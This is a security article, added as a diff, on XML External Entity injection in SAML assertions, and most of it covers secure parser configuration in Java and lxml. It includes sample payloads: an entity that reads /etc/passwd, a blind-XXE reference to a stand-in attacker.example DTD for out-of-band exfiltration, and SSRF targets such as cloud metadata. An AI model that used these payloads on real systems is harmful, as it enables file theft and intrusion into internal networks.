@@ -1,0 +1,145 @@
+---
+title: "SAML XML External Entity (XXE) Injection: Attack Flow and Defenses"
+description: "How attackers use XML External Entity injection in SAML assertions to read local files, trigger SSRF, and exfiltrate data via blind XXE — and how to lock down the parser to stop it."
+categorySlug: "identity-access"
+articleType: "DEEP_DIVE"
+tags:
+  - "saml"
+  - "xxe"
+  - "xml-external-entity"
+  - "ssrf"
+  - "dtd"
+  - "sso"
+  - "blind-xxe"
+---
+
+# SAML XML External Entity (XXE) Injection: Attack Flow and Defenses
+
+## The Problem: The Inherent Insecurity of Legacy XML Parsing
+
+The Security Assertion Markup Language (SAML) protocol is the foundation of enterprise Single Sign-On (SSO). It relies on XML-formatted assertions passed between an Identity Provider (IdP) and a Service Provider (SP). While XML is highly structured, legacy XML parsers are notoriously insecure by default.
+
+Standard XML specifications support Document Type Definitions (DTDs), which allow XML documents to define internal or external variables known as "entities." When a Service Provider parses a user-submitted SAML Response, its XML engine may attempt to resolve these external entities. If an attacker intercepts or crafts a SAML assertion, they can inject malicious external entity references — an **XML External Entity (XXE) injection** attack. When the SP parses the assertion, the parser can be forced to read sensitive files from the local filesystem, perform server-side request forgery (SSRF) to probe internal network services, or trigger a Denial of Service (DoS) through deep entity recursion.
+
+## The Mental Model: The XXE Execution Flow
+
+SAML assertions are sent via the user's browser (user-agent) to the SP's Assertion Consumer Service (ACS) endpoint. The attacker intercepts this HTTP POST payload, decodes the Base64 SAML Response, inserts the malicious DTD, re-encodes it, and submits it to the SP.
+
+```text
+ Attacker                      Service Provider (ACS Endpoint)            Local Filesystem
+    |                                         |                                  |
+    |--- 1. HTTP POST (Base64 SAML XML) ----->|                                  |
+    |    (With Malicious External Entity)    |--- 2. Instantiates Parser ------>|
+    |                                         |                                  |
+    |                                         |--- 3. Resolves Entity ---------->|
+    |                                         |       (e.g., reads config file)  |
+    |                                         |<-- 4. Returns File Content ------|
+    |                                         |                                  |
+    |<-- 5. Leaked Content in Error/Claims ---|                                  |
+```
+
+If the parser resolves the entity, it binds the local file's content to an XML element. If the SP reflects this element in its UI or an error log, the attacker extracts the file directly. If not, the attacker can use **Blind XXE** to exfiltrate the file content via an out-of-band HTTP request to an attacker-controlled listener — the entity's replacement text is used to build a URL that is fetched by the parser itself, leaking data even when nothing is ever displayed back to the attacker.
+
+## Technical Attack Vectors in SAML Parsers
+
+Below is a typical exploit payload injected into a SAML Assertion:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE saml:Response [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<saml:Response xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_1234">
+  <saml:Issuer>https://identity.serenya.com</saml:Issuer>
+  <saml:Assertion>
+    <saml:Subject>
+      <saml:NameID>&xxe;</saml:NameID>
+    </saml:Subject>
+  </saml:Assertion>
+</saml:Response>
+```
+
+When the SP's parser encounters `&xxe;`, it retrieves `/etc/passwd` and places its content inside the `NameID` field, leaking it to the attacker when the application displays the logged-in username.
+
+### Blind XXE via Out-of-Band Exfiltration
+
+When the response never reflects the resolved entity anywhere visible, an attacker instead points the entity at a resource that itself triggers an outbound request, carrying the stolen data as part of the URL:
+
+```xml
+<!DOCTYPE saml:Response [
+  <!ENTITY % remote_dtd SYSTEM "http://attacker.example/evil.dtd">
+  %remote_dtd;
+]>
+```
+
+Where `evil.dtd`, hosted by the attacker, defines a parameter entity that reads a local file and appends its content to a request back to the attacker's own listener — a classic out-of-band (OOB) exfiltration channel that works even when the SP never shows the parsed value to the user.
+
+### Server-Side Request Forgery (SSRF)
+
+Instead of `file://`, an attacker can point the `SYSTEM` identifier at an internal URL (`http://169.254.169.254/latest/meta-data/` for cloud instance metadata, or `http://internal-admin-panel:8080/`). The XML parser, running inside the trusted network perimeter, makes the request on the attacker's behalf — a classic SSRF pivot that bypasses network-layer firewalls entirely because the request originates from a trusted internal host.
+
+## Mitigating XXE: Securing the Parser
+
+The ultimate defense against XXE is disabling external DTD resolution completely. Simply sanitizing inputs or validating signatures is insufficient, because signature validation itself often requires parsing the XML document *first*, triggering the vulnerability before any validation logic ever runs.
+
+### Secure Java XML Parsing Configuration
+
+If the SP is built in Java (a common language for enterprise SAML implementations), you must configure the `DocumentBuilderFactory` to reject external entity and DTD resolution:
+
+```java
+import javax.xml.parsers.DocumentBuilderFactory;
+import javax.xml.parsers.ParserConfigurationException;
+
+public class SecureSAMLParser {
+    public static DocumentBuilderFactory getSecureFactory() throws ParserConfigurationException {
+        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+
+        // Disable DTDs entirely (This prevents both XXE and Billion Laughs)
+        String FEATURE = "http://apache.org/xml/features/disallow-doctype-decl";
+        dbf.setFeature(FEATURE, true);
+
+        // Alternatively, disable external entities if DTDs are strictly necessary
+        dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
+        dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+        dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
+
+        // Mitigate XML Entity Expansion Attacks
+        dbf.setXIncludeAware(false);
+        dbf.setExpandEntityReferences(false);
+
+        return dbf;
+    }
+}
+```
+
+### Secure Python (lxml) Configuration
+
+```python
+from lxml import etree
+
+def get_secure_parser() -> etree.XMLParser:
+    return etree.XMLParser(
+        resolve_entities=False,  # never expand entities, internal or external
+        no_network=True,         # never fetch external DTD/entity URLs over the network
+        dtd_validation=False,
+        load_dtd=False,
+    )
+
+def parse_saml_response(raw_xml: bytes):
+    parser = get_secure_parser()
+    return etree.fromstring(raw_xml, parser)
+```
+
+## Defensive Best Practices
+
+1. **Never Parse Unsigned Assertions:** Ensure that the SAML parser validates the cryptographic signature of the SAML Assertion *using a securely configured parser* before processing any node values.
+2. **Implement Least Privilege Execution:** Run the application server under a user context that has minimal local file read privileges, limiting the impact if an XXE vulnerability is exploited.
+3. **Block Outbound Traffic from the Parsing Process:** Egress-filter the host running the XML parser so it cannot reach arbitrary internal IPs or the cloud metadata endpoint, closing the SSRF pivot even if a parser misconfiguration slips through.
+4. **Use JSON-Based SSO Alternatives:** For new architectures, prefer OpenID Connect (OIDC) over SAML. OIDC uses JSON (JWTs), which natively lacks entity resolution or DTD mechanics, eliminating the XXE attack surface completely.
+
+## Key Takeaways
+
+- XXE lets an attacker read local files, pivot to internal services via SSRF, or exfiltrate data out-of-band, all through a single malicious `<!ENTITY>` declaration in a SAML assertion.
+- Blind XXE (no reflected output) still works via an out-of-band DTD hosted by the attacker, so "we don't display the parsed value" is not a mitigation.
+- The fix is disabling DTD/external entity resolution at the parser level (`disallow-doctype-decl` in Java, `resolve_entities=False, no_network=True` in lxml) — not input sanitization, because signature validation itself parses the XML first.
+- Defense-in-depth adds least-privilege file permissions and egress filtering so a parser misconfiguration alone cannot become a full file-read or SSRF primitive.
